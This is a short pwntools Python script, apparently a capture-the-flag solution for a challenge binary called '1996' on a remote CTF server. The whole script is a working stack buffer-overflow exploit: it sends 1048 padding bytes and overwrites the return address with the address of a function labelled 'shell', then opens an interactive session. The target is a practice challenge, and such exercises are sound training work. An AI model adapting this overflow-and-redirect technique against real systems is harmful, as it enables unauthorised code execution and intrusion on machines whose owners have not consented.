from pwn import *

#r = process('./1996')
r = remote('ctf.j0n9hyun.xyz', 3013)

shell = 0x0000000000400897

payload = ''
payload += "A"*1048
payload += p64(shell)

r.sendlineafter('? ', payload)
r.interactive()
